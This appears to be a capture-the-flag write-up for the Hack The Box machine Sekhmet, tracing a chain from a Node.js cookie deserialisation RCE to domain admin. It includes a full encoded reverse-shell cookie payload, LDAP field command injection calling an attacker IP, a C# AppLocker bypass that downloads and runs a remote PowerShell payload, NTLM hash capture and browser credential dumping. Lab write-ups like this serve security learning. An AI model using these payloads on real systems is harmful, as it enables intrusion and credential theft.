---
description: Took me a few weeks...really long and really convuluted.
---

# Sekhmet

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (2193).png" alt=""><figcaption></figcaption></figure>

When trying to head to the webpage, we need to use the `www.windcorp.htb`domain.

### Windcorp.htb

The page displays a common corporate website:

<figure><img src="../../../.gitbook/assets/image (821).png" alt=""><figcaption></figcaption></figure>

Looking through the web page, we can take note of some names which might be important:

<figure><img src="../../../.gitbook/assets/image (3944).png" alt=""><figcaption></figcaption></figure>

This website might have other subdomains, so I began fuzzing with `gobuster` and `wfuzz`. Found one at `portal.windcorp.htb`.

<figure><img src="../../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

We can add that to the `/etc/hosts` file and enumerate there.

### Portal Login

At the new domain, we are greeted by a login page.

<figure><img src="../../../.gitbook/assets/image (2755).png" alt=""><figcaption></figcaption></figure>

I attempted to login with `admin:admin`, and it worked!

<figure><img src="../../../.gitbook/assets/image (2454).png" alt=""><figcaption><p><br></p></figcaption></figure>

When proxying the traffic, we can view an interesting cookie.

```http
GET / HTTP/1.1
Host: portal.windcorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://portal.windcorp.htb/
Connection: close
Cookie: app=s%3Agpu_VEXOnSx4-DXarW50akMCYR8ZSm9_.f89t1kW2npm6XUdPPPGRWt8oGUSWc%2FfSx9Dy%2BNDPKbI; profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2NzExMDc1NzU3NDR9
Upgrade-Insecure-Requests: 1
If-None-Match: W/"56c-p/i7GTqmqUq+k/bjnk4SFBcSAkI"
```

The `profile` cookie looked like a JWT token, but it was not.

<figure><img src="../../../.gitbook/assets/image (3795).png" alt=""><figcaption></figcaption></figure>

Also, the website was **powered by Express,** which might be useful in determining possible exploits regarding these cookies.

### ModSec RCE

When trying to fuzz the login page with some SQL Injection payloads, I got this error.

<figure><img src="../../../.gitbook/assets/image (1787).png" alt=""><figcaption></figcaption></figure>

It seems that ModSec is the WAF used to protect this webpage. Odd that they would include this. Research on some cookie related exploits for Mod Security revealed a few good articles.

{% embed url="https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/" %}

This article states how there's a DoS condition possible with Mod Security through the use of a second `=` sign within the cookie parameter.

<figure><img src="../../../.gitbook/assets/image (1455).png" alt=""><figcaption></figcaption></figure>

The PoC also states that it's possible to inject payloads through this.

<figure><img src="../../../.gitbook/assets/image (2110).png" alt=""><figcaption></figcaption></figure>

So with this website, so far we know that this is running an Express framework, and the cookie is the point of injection. Doing research on cookie and Express related vulnerabilities led me to this article:

{% embed url="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" %}

There might be a deserialisation exploit with the cookies here, and ModSec was the hint to use the cookies.

We can follow the tutorial exactly to create the payload. First we can generate the shell using `nodejsshell.py` provided by the article and use base64 to encode it.

<figure><img src="../../../.gitbook/assets/image (711).png" alt=""><figcaption></figcaption></figure>

Then, we would need to append something at the back of the cookie **to make sure we bypass ModSec and let the cookie pass through**. This would allow for the RCE to work. This was the final request sent via Burpsuite:

```http
GET / HTTP/1.1
Host: portal.windcorp.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://portal.windcorp.htb/
Connection: close
Cookie: app=s%3A-wO6tgy8NZeUVcdkDvhejiUAFnjWV4fN.IDH27QTkcSDT1pCjEuSFu7qys857BPvs2JylB3izp2g; profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw0OCw0Niw0OSw0OCw0Niw0OSw1Miw0Niw1MCw1NywzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1MSw1MSw1MSw1MSwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9KCkifSAg=profile
Upgrade-Insecure-Requests: 1
If-None-Match: W/"570-pCEHA1bFjNPlboV91WiNzCFs0wY"

```

I managed to retrieve a shell using this method as a `webster` user after sending this request.

<figure><img src="../../../.gitbook/assets/image (2351).png" alt=""><figcaption></figcaption></figure>

## Webserver Foothold

This machine was supposed to be a Windows machine, but I ended up within a Linux host? I found that incredibly odd. This confirms that this box has multiple hosts on it, with different operating systems and is probably Active Directory related.

### ZIP Cracking

Anyways, when viewing the home directory, we see this backup.zip file:

<figure><img src="../../../.gitbook/assets/image (4003).png" alt=""><figcaption></figcaption></figure>

When trying to unzip it, we can see that it is password protected and that the `/etc/passwd` file si within it. There are also a ton of other files related to Active Directory, such as GPOs and Kerberos configurations.

<figure><img src="../../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

I found it incredibly odd that there was a random zip file here. Trying to crack the hash didn't work for me as well. Transferring the file back to my machine, we can use `7z l -slt` to view the technical information of the zip file.

<figure><img src="../../../.gitbook/assets/image (1647).png" alt=""><figcaption></figcaption></figure>

This was using ZipCrypto Deflate, meaning that the `bkcrack` exploit would work on this due to the legacy encryption used.

{% embed url="https://github.com/kimci86/bkcrack" %}

To exploit this:

```bash
# create a new zip of the passwd file
cp /etc/passwd .
zip passwd.zip passwd
# use bkcrack to crack the keys
./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd
# use the codes found to create a new zip file with a known password
./bkcrack -C backup.zip -U cracked.zip password -k <code1> <code2> <code3>
```

This should create a new zip file that we can open easily.

<figure><img src="../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

Now, we can take a proper look at the files within this zip folder.

### File Enum

Within the zip file, there were tons of configuration files to look through. Naturally, the `/var/lib/sss/db` folder caught my attention first.

Within it, there were some ldb files.

<figure><img src="../../../.gitbook/assets/image (2728).png" alt=""><figcaption></figcaption></figure>

Within the cache\_windcorp.htb.ldb file, I found a credential after using `strings` on it. The user was `ray.duncan`.

<figure><img src="../../../.gitbook/assets/image (3274).png" alt=""><figcaption></figcaption></figure>

And he has a hashed password within this folder.

<figure><img src="../../../.gitbook/assets/image (3275).png" alt=""><figcaption></figcaption></figure>

This hash can be cracked easily:

<figure><img src="../../../.gitbook/assets/image (2174).png" alt=""><figcaption></figcaption></figure>

So now we have SOME credentails. Doing further enumeration on the files reveals that there are other networks present on this machine.

<figure><img src="../../../.gitbook/assets/image (2129).png" alt=""><figcaption></figcaption></figure>

So 192.168.0.2 had the KDC (and hence DC) of this machine. Within the other db files, there was mention of a `hope.windcorp.htb` domain.

<figure><img src="../../../.gitbook/assets/image (793).png" alt=""><figcaption></figcaption></figure>

### Ray.Duncan

Within the machine, we can attempt to SSH in as ray.duncan@windcorp.htb (yes that's his user).

<figure><img src="../../../.gitbook/assets/image (2967).png" alt=""><figcaption></figcaption></figure>

Now, we are on the same webserver host with persistence this time. Because of all of the Kerberos stuff and confirmation that this is an AD-related machine, we can request and cache a ticket via `kinit`. Searching on how to use a ticket in Linux led me to `ksu`, which basically is `su` with Kerberos.

With these commands, we can become root on this machine and capture the user flag.

<figure><img src="../../../.gitbook/assets/image (2363).png" alt=""><figcaption></figcaption></figure>

## Active Directory

### Domain Enum

Earlier, we found another IP address at 192.168.0.2. I wanted to enumerate the ports that are open on that machine. We can first see what ports are open with this one liner:

```bash
for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z & done 2> output.txt
```

From here, we can see some ports that are open.

<figure><img src="../../../.gitbook/assets/image (1114).png" alt=""><figcaption></figcaption></figure>

This pretty much confirms that the actual DC is at 192.168.0.2. We would need to use chisel and proxychains to direct traffic there for further enumeration.

```bash
# on Kali
./chisel server --port 8888 --reverse

# on host
./chisel client --max-retry-count=1 10.10.14.29:8888 R:1080:socks
```

Afterwards, we can reach the DC just fine.

<figure><img src="../../../.gitbook/assets/image (1186).png" alt=""><figcaption></figcaption></figure>

Now we can start with some proper enumeration of the domain. The first thing I noted was that port 53 for DNS was open within the output. We can use dig top find out

### Silver Ticket and SMB Shares

With the credentials for ray.duncan, we can actually request a ticket for him. This can be done using `getST.py`.

<figure><img src="../../../.gitbook/assets/image (2534).png" alt=""><figcaption></figcaption></figure>

WIth this ticket, we can check out the shares within the domain, since SMB was open on the host.

<figure><img src="../../../.gitbook/assets/image (3806).png" alt=""><figcaption></figcaption></figure>

WC-Share was something new.

<figure><img src="../../../.gitbook/assets/image (2983).png" alt=""><figcaption></figcaption></figure>

Within this .txt file, we find an interesting output.

<figure><img src="../../../.gitbook/assets/image (1298).png" alt=""><figcaption></figcaption></figure>

I wasn't sure what to do with this, but we can keep it for now I guess.

### LDAP Enum + RCE

SMB revealed nothing of interest, so I moved onto LDAP enumeration. I dumped information using `ldapsearch`. This was done on the container using the ticket we cached for ray.duncan earlier with `kinit`.

<figure><img src="../../../.gitbook/assets/image (1393).png" alt=""><figcaption></figcaption></figure>

Analysing the information, we notice that the numbers and users and numbers we found earlier on the shares are present in the `mobile` field for users.

<figure><img src="../../../.gitbook/assets/image (3845).png" alt=""><figcaption></figcaption></figure>

I was wondering what this parameter was used for, and why was it hinted at. The first thing that comes to mind is testing for RCE or other injection payloads. To modify LDAP entries, we would need to use `ldapmodify`. This also involves the creation of LDIF files.

{% embed url="https://www.digitalocean.com/community/tutorials/how-to-use-ldif-files-to-make-changes-to-an-openldap-system" %}

I created this LDIF file first to test. Then I updated the entry and was surprised to get a hit back!

```
dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
changetype: modify
replace: mobile
mobile: 1;curl http://10.10.14.29/rcecfmed
```

<figure><img src="../../../.gitbook/assets/image (3393).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>

This confirms we have RCE. Now, we can attempt to gain a reverse shell on the machine. I tried downloading nc.exe on the machine, and noticed that there was a character limit on the mobile entry. Anyways, downloading the file to `C:\Windows\Tasks\` works, but it does not seem to execute to give me my shell.

### AMSI + AppLocker Bypass

Perhaps some kind of Windows Security was running on the machine and not allowing it. I tried a few directories, such as AppLocker. And if there's AppLocker, there could be AMSI as well, meaning we cannot just use nc.exe but we have to create a new executable to do so.

Also, because we have a character limit, we would likely need to create a .exe file for the reverse shell. So I booted up a Windows VM and started searching for possible payloads.

This repo from MinatoTW was very helpful:

{% embed url="https://github.com/MinatoTW/CLMBypassBlogpost" %}

Within the code, I changed the command executed to download Invoke-PowerShellTcp from our machine.

```csharp
String exec = "iex(new-object net.webclient).downloadstring('http://10.10.14.29/payload')";  // Modify for custom commands
```

Then, we can compile it using `csc.exe` within our Windows machine.

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:System.Management.Automation.dll Program.cs
```

Take note that the `System.Management.Automation.dll` is within the repo but I moved it up a few directories. Then, once compiled we can transfer it back to our machine.

We can change the commands executed within the `program.cs` file to what we want, then we can compile this thing and put it within a directory. I changed directories to `C:\Windows\Debug\wia` , then updated the LDAP entry to download and execute the shell.

Eventually, you'll get a shell.

<figure><img src="../../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>

The shell is a bit buggy if we leave the LDAP entry that is executing the payload to continue running, so I changed it back to numbers after getting the shell to prevent this from happening.

## Privilege Escalation

### Enum

As this new user, I enumerated around a bit. Found another user on the host named Bob.Wood.

<figure><img src="../../../.gitbook/assets/image (3756).png" alt=""><figcaption></figcaption></figure>

We also find out the Domain Admins:

<figure><img src="../../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>

Seems that bob.wood is both a user and an admin. Perhaps, he is using the same device to switch between user and administrator accounts. We'll keep this in mind for later.

I ran WinPEAS within the machine in the `C:\Windows\Debug\wia` directory to bypass AppLocker once more.

We can check to see that the NTLM settings are insecure:

<figure><img src="../../../.gitbook/assets/image (2920).png" alt=""><figcaption></figcaption></figure>

NTLMv2 is the legacy protocol that uses the challenge-response method of authenticating users, and **this involves sending the user hash**. This means that the next step is to intercept this response and capture the hash.

### NTLM Leak

For some reason, it wouldn't let me authenticate to my own SMB server from the DC. To circumvent this, we can head to the compromised webserver container and run smbserver there.

First, we can find out the webserver's domain name:

<figure><img src="../../../.gitbook/assets/image (3503).png" alt=""><figcaption></figcaption></figure>

Then, we can simply use a `smbserver` binary from here.

{% embed url="https://github.com/ropnop/impacket_static_binaries/releases" %}

Here's the output of that:

<pre class="language-bash"><code class="lang-bash"><strong># on webserver container
</strong>chmod +x smbserver
./smbserver share . -smb2support

# on DC
net use \\webserver.windcorp.htb\share
</code></pre>

<figure><img src="../../../.gitbook/assets/image (3446).png" alt=""><figcaption></figcaption></figure>

We can then crack this hash using `john`.

<figure><img src="../../../.gitbook/assets/image (2830).png" alt=""><figcaption></figcaption></figure>

### Bob.Wood

Now that we have one set of credentials, we can think about how to gain a shell on bob.wood. I tried remote Powershell with the credentials, and found that they were re-used!

<figure><img src="../../../.gitbook/assets/image (3581).png" alt=""><figcaption></figcaption></figure>

With this, we can gain another shell on the host using the same binary that bypassed AppLocker and AMSI.

<figure><img src="../../../.gitbook/assets/image (2172).png" alt=""><figcaption></figcaption></figure>

### Bob.Woodadm

We already know that Bob.Wood has another account on the domain with administrator privileges. Perhaps the credentials for the administrator are hidden somewhere on this account, perhaps in some file or cache.

I could not run winPEAS for some reason, always crashed my shell. So I manually enumerated the box. I checked for app caches, hidden files, and browser caches. In the `C:\Users\Bob.Wood\AppData\Local\Microsoft\Edge\User Data\Default` file, there was a Login Data file which looked rather suspicious.

There was mention of the bob.woodADM user here.

<figure><img src="../../../.gitbook/assets/image (1780).png" alt=""><figcaption></figcaption></figure>

I went to search for Github Repos with tools that could decrypt this thing, and eventually found one here:

{% embed url="https://github.com/moonD4rk/HackBrowserData" %}

This tool would help us decrypt the data we need. We can download this to the machine. We can run this thing, and see that it successfully dumps out data from the browser.

<figure><img src="../../../.gitbook/assets/image (3285).png" alt=""><figcaption></figcaption></figure>

And we can find the credentials for bob.woodadm.

<figure><img src="../../../.gitbook/assets/image (2842).png" alt=""><figcaption></figcaption></figure>

Now, we can attempt some remote Powershell again.

<figure><img src="../../../.gitbook/assets/image (2828).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2661).png" alt=""><figcaption></figcaption></figure>

Then, we can finally capture this flag and end the box. This machine took about 2 weeks to finish because all the steps were pretty hard to spot...
